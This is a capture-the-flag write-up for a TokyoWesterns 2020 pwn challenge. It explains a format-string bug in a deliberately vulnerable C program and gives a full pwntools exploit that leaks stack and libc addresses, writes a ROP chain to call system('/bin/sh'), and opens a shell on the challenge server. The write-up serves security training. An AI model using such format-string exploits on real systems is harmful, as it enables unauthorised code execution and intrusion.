#  TokyoWesterns CTF 6th 2020

## nothing more to say 2020

> 111
> 
> Enjoy!
> 
> [`nothing`](nothing)  
> [`nothing.c`](nothing.c)
> 
> `nc pwn02.chal.ctf.westerns.tokyo 18247`

Tags: _pwn_ _x86-64_ _remote-shell_ _rop_ _format-string_


## Summary

Basic format-string leak and exploit.


## Analysis

### Just run it

```
Hello CTF Players!
This is a warmup challenge for pwnable.
Do you know about Format String Attack(FSA) and write the exploit code?
Please pwn me!
>
```
_Spoiler Alert!_

Well, if you know how to Google, you can solve this challenge a number of different ways.


### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

No mitigations in place.  However, _we're not going to take advantage of any of this--not necessary._  

> Well, _I am_ going to use the _No PIE_ for a single ROP gadget.


### Source included


```c
// gcc -fno-stack-protector -no-pie -z execstack
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void init_proc() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);
}

void read_string(char* buf, size_t length) {
    ssize_t n;
    n = read(STDIN_FILENO, buf, length);
    if (n == -1)
        exit(1);
    buf[n] = '\0';
}

int main(void) {
    char buf[0x100];
    init_proc();
    printf("Hello CTF Players!\nThis is a warmup challenge for pwnable.\nDo you know about Format String Attack(FSA) and write the exploit code?\nPlease pwn me!\n");
    while (1) {
        printf("> ");
        read_string(buf, 0x100);
        if (buf[0] == 'q')
            break;
        printf(buf);
    }
    return 0;
}
```

`printf(buf)` is the vulnerability, and since looped, we can abuse it as many times as necessary.  We will however need to know the version of libc for the exploit I have in mind (to get a hint just: `strings nothing | grep GCC`):

```
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
```

Next, from within a Ubuntu 18.04 container, find the format-string offset and look at the stack:

```
gef➤  b *main+101
Breakpoint 1 at 0x4007ba
gef➤  run
Starting program: /pwd/datajerk/twctf2020/nothing_more_to_say_2020/nothing
Hello CTF Players!
This is a warmup challenge for pwnable.
Do you know about Format String Attack(FSA) and write the exploit code?
Please pwn me!
> %6$p
0xa70243625
```

Above, set a break point to get the stack while in `main`, and also try `%n$p` where `n > 0` until the output (in little endian) hex matches the input.  In this case it's `6`, and that will be the offset.

The stack:

```
0x00007fffffffe280│+0x0000: 0x0000000a70243625 ("%6$p\n"?  ← $rsp
0x00007fffffffe288│+0x0008: 0x0000000000000000
0x00007fffffffe290│+0x0010: 0x0000000000000000
0x00007fffffffe298│+0x0018: 0x00007ffff7ffe710  →  0x00007ffff7ffa000  →  0x00010102464c457f
0x00007fffffffe2a0│+0x0020: 0x00007ffff7b979e7  →  "__vdso_getcpu"
0x00007fffffffe2a8│+0x0028: 0x0000000000000000
0x00007fffffffe2b0│+0x0030: 0x00007fffffffe2e0  →  0x00000000ffffffff
0x00007fffffffe2b8│+0x0038: 0x00007fffffffe2f0  →  0x00007ffff7ffa268  →  0x000c001200000036 ("6"?)
0x00007fffffffe2c0│+0x0040: 0x00007ffff7ffea98  →  0x00007ffff7ffe9c8  →  0x00007ffff7ffe738  →  0x00007ffff7ffe710  →  0x00007ffff7ffa000  →  0x00010102464c457f
0x00007fffffffe2c8│+0x0048: 0x0000000000000000
0x00007fffffffe2d0│+0x0050: 0x0000000000000000
0x00007fffffffe2d8│+0x0058: 0x00007fffffffe300  →  0x0000000000000000
0x00007fffffffe2e0│+0x0060: 0x00000000ffffffff
0x00007fffffffe2e8│+0x0068: 0x0000000000000000
0x00007fffffffe2f0│+0x0070: 0x00007ffff7ffa268  →  0x000c001200000036 ("6"?)
0x00007fffffffe2f8│+0x0078: 0x00007ffff7ffe710  →  0x00007ffff7ffa000  →  0x00010102464c457f
0x00007fffffffe300│+0x0080: 0x0000000000000000
0x00007fffffffe308│+0x0088: 0x0000000000000000
0x00007fffffffe310│+0x0090: 0x0000000000000000
0x00007fffffffe318│+0x0098: 0x00000000756e6547 ("Genu"?)
0x00007fffffffe320│+0x00a0: 0x0000000000000009
0x00007fffffffe328│+0x00a8: 0x00007ffff7dd7660  →  <dl_main+0> push rbp
0x00007fffffffe330│+0x00b0: 0x00007fffffffe398  →  0x00007fffffffe468  →  0x00007fffffffe6eb  →  "/pwd/datajerk/twctf2020/nothing_more_to_say_2020/n[...]"
0x00007fffffffe338│+0x00b8: 0x0000000000f0b5ff
0x00007fffffffe340│+0x00c0: 0x0000000000000001
0x00007fffffffe348│+0x00c8: 0x000000000040081d  →  <__libc_csu_init+77> add rbx, 0x1
0x00007fffffffe350│+0x00d0: 0x00007ffff7de59f0  →  <_dl_fini+0> push rbp
0x00007fffffffe358│+0x00d8: 0x0000000000000000
0x00007fffffffe360│+0x00e0: 0x00000000004007d0  →  <__libc_csu_init+0> push r15
0x00007fffffffe368│+0x00e8: 0x00000000004005e0  →  <_start+0> xor ebp, ebp
0x00007fffffffe370│+0x00f0: 0x00007fffffffe460  →  0x0000000000000001
0x00007fffffffe378│+0x00f8: 0x0000000000000000
0x00007fffffffe380│+0x0100: 0x00000000004007d0  →  <__libc_csu_init+0> push r15	 ← $rbp
0x00007fffffffe388│+0x0108: 0x00007ffff7a05b97  →  <__libc_start_main+231> mov edi, eax
```

Starting from the top (offset 6) looking down there are two values that if leaked will give us the stack address of the return address (offset 36 (`+0x00f0`)) and the version and location of libc (offset 39 (`+0x0108`)).

With this in hand it will be easy to write out a ROP chain to call `system` on exit.


## Exploit

### Setup

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./nothing')
context.log_level = 'INFO'

if not args.REMOTE:
    context.log_file = 'local.log'
    libc = binary.libc
    p = process(binary.path)
else:
    context.log_file = 'remote.log'
    libc_index = 5
    p = remote('pwn02.chal.ctf.westerns.tokyo', 18247)
```

Boilerplate pwntool, however, `libc_index` is not _boilerplate_.  More on this below.


### Leak

```python
p.sendlineafter('> ','%36$p,%39$p')
_ = p.recvline().strip().split(b',')

stack_ret_addr = int(_[0],16) - 216
log.info('stack_ret_addr: ' + hex(stack_ret_addr))

__libc_start_main_231 = int(_[1],16)
log.info('__libc_start_main_231: ' + hex(__libc_start_main_231))
log.info('__libc_start_main: ' + hex(__libc_start_main_231 - 231))
```

Requesting parameters 36 and 39 provide the necessary bits to compute the location of the return address and libc (if we know the libc version).

The `216` above was hand computed from the stack diagram above, specifcally this section:

```
0x00007fffffffe370│+0x00f0: 0x00007fffffffe460  →  0x0000000000000001
0x00007fffffffe378│+0x00f8: 0x0000000000000000
0x00007fffffffe380│+0x0100: 0x00000000004007d0  →  <__libc_csu_init+0> push r15	 ← $rbp
```

The return address location is `0x00007fffffffe388` (just under (or above depending on how you look at it) `$rbp`), and the leak from offset 36 (`+0x00f0`) is `0x00007fffffffe460`.  `0x00007fffffffe460 - 0x00007fffffffe388 = 216`.


### Find and download libc

```python
if not 'libc' in locals():
    try:
        import requests
        r = requests.post('https://libc.rip/api/find', json = {'symbols':{'__libc_start_main':hex(__libc_start_main_231 - 231)[-3:]}})
        libc_url = r.json()[libc_index]['download_url']
        libc_file = libc_url.split('/')[-1:][0]
        if not os.path.exists(libc_file):
            log.info('getting: ' + libc_url)
            r = requests.get(libc_url, allow_redirects=True)
            open(libc_file,'wb').write(r.content)
    except:
        log.critical('get libc yourself!')
        sys.exit(0)
    libc = ELF(libc_file)

libc.address = __libc_start_main_231 - libc.sym.__libc_start_main - 231
log.info('libc.address: ' + hex(libc.address))
```

> This is something new I'm experimenting with.

This code will search the libc-database and return an array of matches; through trial and error the 5th (see `libc_index = 5` above) is the libc that works with this challenge.

> This was actually unnecessary since a fully updated Ubuntu 18.04 container has the correct version installed.  But, I wanted to test this method.


### Get a shell, get the flag

```python
offset = 6
rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

payloads = [pop_rdi + 1,pop_rdi,libc.search(b'/bin/sh').__next__(),libc.sym.system]
for i in range(len(payloads)):
    payload=fmtstr_payload(offset,{stack_ret_addr+8*i:payloads[i]})
    p.sendline(payload)
    null = payload.find(b'\x00')
    p.recvuntil(payload[null-2:null])

p.sendlineafter('> ','q')
p.interactive()
```

The `payloads` array is standard CTF fare.  The for loop uses format-string exploits to write out the payload starting from the return address in the stack.  From there is just `q` to exit `main` and run our exploit.

> The following lines capture all the format-string exploit garbage for pretty screen grabs (for write-ups):
> 
> ```python
> null = payload.find(b'\x00')
> p.recvuntil(payload[null-2:null])
> ``` 

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/twctf2020/nothing_more_to_say_2020/nothing'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Opening connection to pwn02.chal.ctf.westerns.tokyo on port 18247: Done
[*] stack_ret_addr: 0x7ffc771b63b8
[*] __libc_start_main_231: 0x7fcde34edb97
[*] __libc_start_main: 0x7fcde34edab0
[*] getting: https://libc.rip/download/libc6_2.27-3ubuntu1.2_amd64.so
[*] '/pwd/datajerk/twctf2020/nothing_more_to_say_2020/libc6_2.27-3ubuntu1.2_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] libc.address: 0x7fcde34cc000
[*] Loaded 14 cached gadgets for './nothing'
[*] Switching to interactive mode
$ id
uid=11901 gid=11000(nothing) groups=11000(nothing)
$ ls -l
total 16
-rw-r----- 1 root nothing   52 Sep 18 15:53 flag.txt
-rwxr-x--- 1 root nothing 8632 Sep 18 15:53 nothing
$ cat flag.txt
TWCTF{kotoshi_mo_hazimarimasita_TWCTF_de_gozaimasu}
```
